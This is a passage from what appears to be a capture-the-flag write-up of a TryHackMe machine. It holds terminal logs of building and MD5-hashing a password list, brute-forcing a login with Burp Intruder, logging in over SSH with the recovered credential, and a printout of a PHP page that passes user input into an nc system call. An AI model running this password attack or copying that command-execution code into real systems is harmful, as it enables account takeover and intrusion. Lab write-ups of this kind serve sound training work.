@@ -152,3 +152,157 @@ for word in memorableWords:
 └─$ python generateList.py > passwords_generated.lst
                                                                                                          
 ┌──(witty㉿kali)-[~/Downloads]
+└─$ cat passwords_generated.lst 
+Italy00!
+Italy01!
+Italy02!
+Italy03!
+Italy04!
+Italy05!
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords_generated.lst | tee -a passwords_hashed.lst
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ head passwords_hashed.lst 
+40bc3113109f8a7bceb98877ace7ffcc
+fb8bb8e4fa357a5bf0f62a48ddf81377
+0954309828d4a04cefd3afcde0f20ae0
+ad1a07cea696edfea2be8ffbd378ef63
+a56453f97de07b20f3037beb2ee469d4
+bcf1d815b9b0c8b2894daaca103e9273
+90dd86eb130099579eed7edacbb2799d
+c3e95889290a9826b352860f7e8bb70f
+62039f00bc2c3e67775d16b550d703bb
+02d55ad46a7dd6d5b53a9256d54a92d6
+
+using burp intruder
+
+{"username":"marco","password":"§f5888d0bb58d611107e11f7cbc41c97a§"}
+
+"username":"marco","password":"ea22b622ba9b3c41b22785dcb40211ac"
+
+HTTP/1.1 200 OK
+
+{"Response":"Success","Verbose":"Logged in successfully","auth":"484364e69546acf7a6736e7e172f69f5"}
+
+ea22b622ba9b3c41b22785dcb40211ac 2022
+
+savoia21! 2022
+
+marco:savoia21!  login
+
+Use this page to execute arbitrary commands on the system
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh marco@10.10.168.36
+The authenticity of host '10.10.168.36 (10.10.168.36)' can't be established.
+ED25519 key fingerprint is SHA256:NA6wxwks9yC9RRUsw12szoz+dTUjJXyA37m9dSsUCa8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.168.36' (ED25519) to the list of known hosts.
+marco@10.10.168.36's password: 
+
+	
+	__   __                       __   _   _            ____  _       
+	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
+	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
+	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
+	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
+	                                                            |___/ 
+
+marco@year-of-the-pig:~$ id
+uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
+marco@year-of-the-pig:~$ ls
+flag1.txt
+marco@year-of-the-pig:~$ cat flag1.txt 
+THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
+marco@year-of-the-pig:~$ ls -lah
+total 24K
+drwxr-xr-x 2 marco marco 4.0K Aug 22  2020 .
+drwxr-xr-x 4 root  root  4.0K Aug 16  2020 ..
+lrwxrwxrwx 1 root  root     9 Aug 16  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 marco marco  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 marco marco 3.7K Apr  4  2018 .bashrc
+-r-------- 1 marco marco   38 Aug 22  2020 flag1.txt
+-rw-r--r-- 1 marco marco  807 Apr  4  2018 .profile
+
+-rw-r--r-- 1 marco marco  807 Apr  4  2018 .profile
+marco@year-of-the-pig:~$ cd /var/www/html/admin
+marco@year-of-the-pig:/var/www/html/admin$ ls
+adduser.php   deleteuser.php      getUsers.php  index.php    prepareAuth.php    sessionCleanup.php
+commands.php  getCurrentUser.php  includes.php  landing.php  resetpassword.php  style.css
+marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
+<?php
+    require_once "/var/www/html/admin/prepareAuth.php";
+    if (!$auth){
+        header("location: /login.php");
+    }
+	$dbh->close();
+?>
+
+<!DOCTYPE html>
+<html>
+	<p id="id" style="display:none">commands</p>
+	<?php require "includes.php";?>
+	<body class="include">
+		<h1 id="content-title">Commands</h1>
+		<h2>Use this page to execute arbitrary commands on the system</h2>
+		<form method=post style="display: inline;">
+			<input type=text name="command" class="input" placeholder="Command...">
+			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
+		</form>
+		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
+		<?php
+			//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+			if (isset($_POST["command"])){
+				echo "<pre>";
+				$cmd=$_POST["command"];
+				if (strlen($cmd) == 0){
+					echo "No command entered";
+				}
+				else if ($cmd == "whoami"){
+					echo "www-data";
+				}
+				else if ($cmd == "id"){
+					echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
+				}
+				else if ($cmd == "ifconfig"){
+					system("ifconfig");
+				}
+				else if (substr($cmd,0,5) == "echo "){
+					echo substr($cmd,5);
+				}
+				else if ($cmd == "hostname"){
+					echo "year-of-the-pig";
+				}
+				else if (stristr($cmd,"nc")){
+					preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
+					$components = explode(" ", $string[0]);
+					$ip = $components[0];
+					$port = end(array_values($components));
+					system("nc $ip $port >/dev/null 2>&1");
+				}
+				else{
+					echo "Invalid Command!";
+				}
+				echo "<pre>\n";
+			}
+		?>
+	</body>
+</html>
+
+replace
+
+marco@year-of-the-pig:/var/www/html/admin$ cat commands.php 
+<?php
+    require_once "/var/www/html/admin/prepareAuth.php";
+    if (!$auth){
+        header("location: /login.php");
+    }
+	$dbh->close();
+?>
+
